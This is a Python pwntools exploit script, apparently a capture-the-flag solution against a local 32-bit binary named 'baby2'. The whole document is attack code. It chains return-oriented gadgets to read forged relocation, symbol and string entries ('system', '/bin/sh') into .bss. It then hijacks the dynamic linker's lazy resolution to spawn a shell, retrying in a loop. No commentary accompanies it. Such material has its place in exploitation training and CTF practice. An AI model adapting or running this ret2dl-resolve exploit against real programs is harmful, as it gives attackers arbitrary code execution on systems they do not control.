from pwn import *
#context.log_level='debug'
got=0x804a00c
read=0x8048330
rbp=0x0804850b
ppp=0x08048509
ret=0x080482fa
bss=0x0804a800
tmp=0xf75d8000+0x3ac62
plt0=0x8048320
strtab=0x8048240
dynsym=0x80481d0
dynrel=0x80482d8
p2=flat(
[got,0x07+(((bss+0x10-dynsym)/0x10)<<8)],0xdeadbeef,0xdeadbeef,# DYN_REL & ALAIGN
[bss+0x28-strtab,0x12,0,0,0,0],#DYNSYM
)+"system\x00\x00"+"/bin/sh\x00"#DYNSTR
context.arch='i386'
while(1):
	p=process("./baby2")
	#gdb.attach(p,'b *0x80484ae')
	payload=p32(ret)*2+p32(read)+p32(ppp)+p32(0)+p32(bss)+p32(0x123)+p32(plt0)+p32((bss-dynrel))+p32(bss+0x30)*2
	payload=payload.ljust(0x2c,'\x00')
	payload+='\x00'
	p.send(payload)
	sleep(0.3)
	#raw_input()
	try:
		p.send(p2)
		p.interactive()
	except Exception:
		p.close()

